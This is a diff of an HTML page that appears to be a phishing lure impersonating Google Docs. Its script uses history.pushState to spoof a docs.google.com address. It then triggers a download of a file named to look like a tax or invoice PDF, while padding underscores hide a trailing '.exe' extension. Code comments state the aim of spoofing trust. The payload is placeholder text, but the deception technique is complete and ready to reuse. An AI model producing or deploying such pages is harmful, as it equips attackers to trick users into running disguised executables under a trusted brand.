@@ -1,68 +1,60 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Secure Document Viewer</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Google Docs</title>
   <style>
     body {
+      background-color: #f8f9fa;
       font-family: Arial, sans-serif;
-      background: #f9f9f9;
       display: flex;
-      flex-direction: column;
-      align-items: center;
       justify-content: center;
+      align-items: center;
       height: 100vh;
-      margin: 0;
     }
     .container {
-      background: #fff;
-      padding: 40px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      border-radius: 8px;
       text-align: center;
     }
-    .button {
-      padding: 12px 24px;
+    .download-btn {
       background-color: #1a73e8;
       color: white;
-      font-size: 16px;
+      padding: 12px 24px;
       border: none;
       border-radius: 4px;
+      font-size: 16px;
       cursor: pointer;
+    }
+    .download-btn:hover {
+      background-color: #0c5cd8;
+    }
+    .desc {
       margin-top: 20px;
-    }
-    .button:hover {
-      background-color: #0c5bd4;
-    }
-    .note {
       font-size: 14px;
-      color: #555;
-      margin-top: 10px;
+      color: #5f6368;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>Secure Document Viewer</h2>
-    <p>Click below to securely download your invoice document.</p>
-    <button class="button" onclick="triggerDownload()">Download secure_invoice.pdf</button>
-    <p class="note">Verified by Google Docs</p>
+    <h2>Download: secure_invoice.pdf</h2>
+    <button class="download-btn" onclick="triggerDownload()">Click to Download</button>
+    <div class="desc">Google Docs viewer may take a few seconds to load</div>
   </div>
 
   <script>
-    function triggerDownload() {
-      // Simulate redirect from docs.google.com (for spoofing trust)
-      history.pushState({}, '', 'https://docs.google.com/viewer?embedded=true');
+    // Simulate spoofed origin context
+    history.pushState({}, '', 'https://docs.google.com/viewer?file=secure_invoice');
 
-      // Create fake PDF-EXE filename
-      const longName = "secure_invoice_2024_verified_document______________________________.pdf.exe";
-      const blob = new Blob(["This is a test executable disguised as a PDF"], { type: "application/octet-stream" });
-      const link = document.createElement("a");
-      link.href = URL.createObjectURL(blob);
-      link.download = longName;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
+    function triggerDownload() {
+      const blob = new Blob(["This is a fake invoice payload"], { type: "application/octet-stream" });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = "Tax_Return_Form_2024_Secure_Copy__________________________.pdf.exe";
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
     }
   </script>
 </body>
